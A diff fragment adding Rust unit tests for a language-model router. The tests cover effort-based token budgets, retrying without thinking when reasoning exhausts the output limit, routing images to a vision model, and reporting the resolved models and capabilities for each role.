+        assert_eq!(b[2]["max_tokens"], 8192);
+        assert!(b[2]["chat_template_kwargs"]["enable_thinking"] == false || b[2]["reasoning_effort"] == "low", "{}", b[2]);
+        let (t, think) = effort_budget(Effort::Max, ModelRole::Agent, &Settings { max_tokens: 4096, ..Default::default() });
+        assert_eq!((t, think), (16384, true), "never more than 4x the max-tokens setting");
+    }
+
+    #[tokio::test]
+    async fn length_with_only_reasoning_retries_without_thinking() {
+        let r = routed(&[SUPER], None, |b| {
+            if b["chat_template_kwargs"]["enable_thinking"] == true {
+                reply("thinking forever", "", "length")
+            } else {
+                reply("", "the answer", "stop")
+            }
+        })
+        .await;
+        let res = call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::user("hi")]).await.unwrap();
+        assert_eq!(res.content, "the answer");
+        assert_eq!(res.model, SUPER);
+        let b = r.bodies().await;
+        assert_eq!(b.len(), 2);
+        assert_eq!(b[1]["chat_template_kwargs"]["enable_thinking"], false);
+        assert!(r.titles().iter().any(|t| t.contains("whole output budget thinking")));
+        // the reasoning was streamed live on its own channel
+        let thinking: String = r.rec.on(channels::AI_THINKING).iter().map(|v| v["text"].as_str().unwrap_or("").to_string()).collect();
+        assert_eq!(thinking, "thinking forever");
+        assert_eq!(r.rec.on(channels::AI_THINKING)[0]["taskId"], "task-1");
+    }
+
+    #[tokio::test]
+    async fn images_are_handed_to_a_vision_model_for_text_only_models() {
+        let r = routed(&[SUPER, VISION_M], None, |b| {
+            let has_image = b["messages"].as_array().unwrap().iter().any(|m| m["content"].is_array());
+            if b["model"] == VISION_M {
+                assert!(has_image, "the vision model receives the image");
+                reply("", "- blue header with a logo\n- three cards", "stop")
+            } else {
+                assert!(!has_image, "the text model never receives image parts");
+                reply("", "rebuilt", "stop")
+            }
+        })
+        .await;
+        let msg = ChatMessage { role: "user".into(), content: "Rebuild this".into(), images: vec!["data:image/png;base64,AAAA".into()] };
+        let res = call(&r, CallOptions::role(ModelRole::Agent), &[ChatMessage::system("sys"), msg]).await.unwrap();
+        assert_eq!(res.model, SUPER);
+        let b = r.bodies().await;
+        assert_eq!(b.len(), 2);
+        let text = b[1]["messages"][1]["content"].as_str().unwrap();
+        assert!(text.starts_with("Rebuild this") && text.contains("blue header with a logo") && text.contains(VISION_M), "{text}");
+        assert!(r.g.attachments_for_message(&r.pid, &[]).is_ok());
+
+        let r = routed(&[SUPER], None, |_| reply("", "x", "stop")).await;
+        let msg = ChatMessage { role: "user".into(), content: "see".into(), images: vec!["data:image/png;base64,AAAA".into()] };
+        assert_eq!(call(&r, CallOptions::role(ModelRole::Agent), &[msg]).await.unwrap_err().kind(), "validation");
+    }
+
+    #[tokio::test]
+    async fn resolved_models_lists_every_role() {
+        let r = routed(&[SUPER, CODER, VISION_M, "openai/gpt-oss-20b"], None, |_| reply("", "ok", "stop")).await;
+        let v = r.g.resolved_models().await.unwrap();
+        for role in ["agent", "code", "plan", "subagent", "quick", "vision"] {
+            assert!(v[role].is_array(), "{role}");
+        }
+        assert_eq!(v["agent"][0], SUPER);
+        assert_eq!(v["vision"], json!([VISION_M]));
+        // the self-model describes auto mode and the vision handoff truthfully
+        let rep = r.g.capability_report_quick(None).unwrap();
+        assert_eq!(rep.provider["modelMode"], "auto");
+        assert_eq!(rep.provider["model"], SUPER);
+        let get = |id: &str| rep.capabilities.iter().find(|c| c.id == id).unwrap().clone();
+        assert!(get("chat").evidence.contains("Auto mode (effort: max)"), "{}", get("chat").evidence);
+        assert_eq!(get("vision").status, "available");
+        assert!(get("vision").evidence.contains(VISION_M));
     }
 }
